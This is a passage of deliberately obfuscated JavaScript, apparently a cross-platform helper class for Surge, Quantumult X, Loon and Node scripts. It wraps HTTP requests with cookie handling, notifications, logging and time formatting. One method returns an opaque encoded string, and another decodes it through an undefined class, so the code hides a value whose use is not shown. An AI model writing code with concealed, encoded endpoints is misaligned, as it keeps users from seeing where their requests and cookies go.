                        ((_0x329258['opts'] = _0x329258['opts'] || {}),
                        Object['assign'](_0x329258['opts'], {
                            hints: false,
                        }))
                    $task['fetch'](_0x329258)['then'](
                        (_0xe0401b) => {
                            const { statusCode: _0x450a8f, statusCode: _0x32aafa, headers: _0x3533a8, body: _0x561e3c } = _0xe0401b

                            _0xbfffd7(
                                null,
                                {
                                    status: _0x450a8f,
                                    statusCode: _0x32aafa,
                                    headers: _0x3533a8,
                                    body: _0x561e3c,
                                },
                                _0x561e3c
                            )
                        },
                        (_0x14b8dc) => _0xbfffd7(_0x14b8dc)
                    )
                } else {
                    if (this['isNode']()) {
                        let _0x29851b = require('iconv-lite')

                        this['initGotEnv'](_0x329258)
                        this['got'](_0x329258)
                            ['on']('redirect', (_0x2535fd, _0x3fec1a) => {
                                try {
                                    if (_0x2535fd['headers']['set-cookie']) {
                                        const _0xa5bb1c = _0x2535fd['headers']['set-cookie']['map'](this['cktough']['Cookie']['parse'])['toString']()

                                        _0xa5bb1c && this['ckjar']['setCookieSync'](_0xa5bb1c, null)
                                        _0x3fec1a['cookieJar'] = this['ckjar']
                                    }
                                } catch (_0x56570a) {
                                    this['logErr'](_0x56570a)
                                }
                            })
                            ['then'](
                                (_0x1b18f5) => {
                                    const { statusCode: _0x36a45, statusCode: _0x4e5967, headers: _0x57c605, rawBody: _0x455280 } = _0x1b18f5

                                    _0xbfffd7(
                                        null,
                                        {
                                            status: _0x36a45,
                                            statusCode: _0x4e5967,
                                            headers: _0x57c605,
                                            rawBody: _0x455280,
                                        },
                                        _0x29851b['decode'](_0x455280, this['encoding'])
                                    )
                                },
                                (_0x385498) => {
                                    const { message: _0x161ec3, response: _0x5c58dc } = _0x385498

                                    _0xbfffd7(_0x161ec3, _0x5c58dc, _0x5c58dc && _0x29851b['decode'](_0x5c58dc['rawBody'], this['encoding']))
                                }
                            )
                    }
                }
            }
        }

        ['post'](_0x2a9a6e, _0x837633 = () => {}) {
            const _0x36b13a = _0x2a9a6e['method'] ? _0x2a9a6e['method']['toLocaleLowerCase']() : 'post'

            if ((_0x2a9a6e['body'] && _0x2a9a6e['headers'] && !_0x2a9a6e['headers']['Content-Type'] && (_0x2a9a6e['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), _0x2a9a6e['headers'] && delete _0x2a9a6e['headers']['Content-Length'], this['isSurge']() || this['isLoon']())) {
                this['isSurge']() &&
                    this['isNeedRewrite'] &&
                    ((_0x2a9a6e['headers'] = _0x2a9a6e['headers'] || {}),
                    Object['assign'](_0x2a9a6e['headers'], {
                        'X-Surge-Skip-Scripting': false,
                    }))

                $httpClient[_0x36b13a](_0x2a9a6e, (_0x50b7c6, _0xec1837, _0xa92484) => {
                    !_0x50b7c6 && _0xec1837 && ((_0xec1837['body'] = _0xa92484), (_0xec1837['statusCode'] = _0xec1837['status']))

                    _0x837633(_0x50b7c6, _0xec1837, _0xa92484)
                })
            } else {
                if (this['isQuanX']()) {
                    _0x2a9a6e['method'] = _0x36b13a
                    this['isNeedRewrite'] &&
                        ((_0x2a9a6e['opts'] = _0x2a9a6e['opts'] || {}),
                        Object['assign'](_0x2a9a6e['opts'], {
                            hints: false,
                        }))
                    $task['fetch'](_0x2a9a6e)['then'](
                        (_0x46275b) => {
                            const { statusCode: _0x1196f3, statusCode: _0x385aeb, headers: _0x23139d, body: _0x3c65a0 } = _0x46275b

                            _0x837633(
                                null,
                                {
                                    status: _0x1196f3,
                                    statusCode: _0x385aeb,
                                    headers: _0x23139d,
                                    body: _0x3c65a0,
                                },
                                _0x3c65a0
                            )
                        },
                        (_0x480b9a) => _0x837633(_0x480b9a)
                    )
                } else {
                    if (this['isNode']()) {
                        let _0x32f63b = require('iconv-lite')

                        this['initGotEnv'](_0x2a9a6e)
                        const { url: _0x3960e5, ..._0xf9ab5d } = _0x2a9a6e

                        this['got'][_0x36b13a](_0x3960e5, _0xf9ab5d)['then'](
                            (_0x30b01c) => {
                                const { statusCode: _0x3d4aa2, statusCode: _0x191242, headers: _0x2f744c, rawBody: _0x1bfcc8 } = _0x30b01c

                                _0x837633(
                                    null,
                                    {
                                        status: _0x3d4aa2,
                                        statusCode: _0x191242,
                                        headers: _0x2f744c,
                                        rawBody: _0x1bfcc8,
                                    },
                                    _0x32f63b['decode'](_0x1bfcc8, this['encoding'])
                                )
                            },
                            (_0x4b3bb1) => {
                                const { message: _0xfbdcd, response: _0x2e857e } = _0x4b3bb1

                                _0x837633(_0xfbdcd, _0x2e857e, _0x2e857e && _0x32f63b['decode'](_0x2e857e['rawBody'], this['encoding']))
                            }
                        )
                    }
                }
            }
        }

        ['time'](_0x428a88, _0x1e747c = null) {
            const _0x3fe9d0 = _0x1e747c ? new Date(_0x1e747c) : new Date()

            let _0x1a1f47 = {
                'M+': _0x3fe9d0['getMonth']() + 1,
                'd+': _0x3fe9d0['getDate'](),
                'H+': _0x3fe9d0['getHours'](),
                'm+': _0x3fe9d0['getMinutes'](),
                's+': _0x3fe9d0['getSeconds'](),
                'q+': Math['floor']((_0x3fe9d0['getMonth']() + 3) / 3),
                S: _0x3fe9d0['getMilliseconds'](),
            }
            ;/(y+)/['test'](_0x428a88) && (_0x428a88 = _0x428a88['replace'](RegExp['$1'], (_0x3fe9d0['getFullYear']() + '')['substr'](4 - RegExp['$1']['length'])))

            for (let _0x5040ae in _0x1a1f47) new RegExp('(' + _0x5040ae + ')')['test'](_0x428a88) && (_0x428a88 = _0x428a88['replace'](RegExp['$1'], 1 == RegExp['$1']['length'] ? _0x1a1f47[_0x5040ae] : ('00' + _0x1a1f47[_0x5040ae])['substr'](('' + _0x1a1f47[_0x5040ae])['length'])))

            return _0x428a88
        }

        ['msg'](_0x4b99a1 = _0x3a97e6, _0x4037b7 = '', _0x559d3e = '', _0x149532) {
            const _0x2eb52e = (_0x22c6c4) => {
                if (!_0x22c6c4) {
                    return _0x22c6c4
                }

                if ('string' == typeof _0x22c6c4) {
                    return this['isLoon']()
                        ? _0x22c6c4
                        : this['isQuanX']()
                        ? {
                              'open-url': _0x22c6c4,
                          }
                        : this['isSurge']()
                        ? {
                              url: _0x22c6c4,
                          }
                        : void 0
                }

                if ('object' == typeof _0x22c6c4) {
                    if (this['isLoon']()) {
                        let _0x495c54 = _0x22c6c4['openUrl'] || _0x22c6c4['url'] || _0x22c6c4['open-url'],
                            _0x1e2a2d = _0x22c6c4['mediaUrl'] || _0x22c6c4['media-url']

                        return {
                            openUrl: _0x495c54,
                            mediaUrl: _0x1e2a2d,
                        }
                    }

                    if (this['isQuanX']()) {
                        let _0x37182c = _0x22c6c4['open-url'] || _0x22c6c4['url'] || _0x22c6c4['openUrl'],
                            _0x362c88 = _0x22c6c4['media-url'] || _0x22c6c4['mediaUrl']

                        return {
                            'open-url': _0x37182c,
                            'media-url': _0x362c88,
                        }
                    }

                    if (this['isSurge']()) {
                        let _0x2e95a6 = _0x22c6c4['url'] || _0x22c6c4['openUrl'] || _0x22c6c4['open-url']

                        return {
                            url: _0x2e95a6,
                        }
                    }
                }
            }

            if ((this['isMute'] || (this['isSurge']() || this['isLoon']() ? $notification['post'](_0x4b99a1, _0x4037b7, _0x559d3e, _0x2eb52e(_0x149532)) : this['isQuanX']() && $notify(_0x4b99a1, _0x4037b7, _0x559d3e, _0x2eb52e(_0x149532))), !this['isMuteLog'])) {
                let _0x526a06 = ['', '==============📣系统通知📣==============']

                _0x526a06['push'](_0x4b99a1)

                _0x4037b7 && _0x526a06['push'](_0x4037b7)
                _0x559d3e && _0x526a06['push'](_0x559d3e)
                console['log'](_0x526a06['join']('\n'))
                this['logs'] = this['logs']['concat'](_0x526a06)
            }
        }

        ['fwcaas']() {
            return 'fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz'
        }

        ['log'](..._0x51036b) {
            _0x51036b['length'] > 0 && (this['logs'] = [...this['logs'], ..._0x51036b])
            console['log'](_0x51036b['join'](this['logSeparator']))
        }

        ['logErr'](_0x45a1b6, _0x2d0553) {
            const _0x4c5d80 = !this['isSurge']() && !this['isQuanX']() && !this['isLoon']()

            _0x4c5d80 ? this['log']('', '❗️' + this['name'] + ', 错误!', _0x45a1b6['stack']) : this['log']('', '❗️' + this['name'] + ', 错误!', _0x45a1b6)
        }

        ['fwur']() {
            var _0x197682 = new FxPCnMKLw7()

            return _0x197682['decode'](this['fwcaas']())
        }

        ['wait'](_0x1e603b) {
            return new Promise((_0x441b51) => setTimeout(_0x441b51, _0x1e603b))
        }

        ['done'](_0x290aaf = {}) {
            const _0x4882e1 = new Date()['getTime'](),
                _0xa32c79 = (_0x4882e1 - this['startTime']) / 1000

            this['log']('', '🔔' + this['name'] + ', 结束! 🕛 ' + _0xa32c79 + ' 秒')
            this['log']()
            ;(this['isSurge']() || this['isQuanX']() || this['isLoon']()) && $done(_0x290aaf)
        }
    })(_0x3a97e6, _0x145d6e)
}
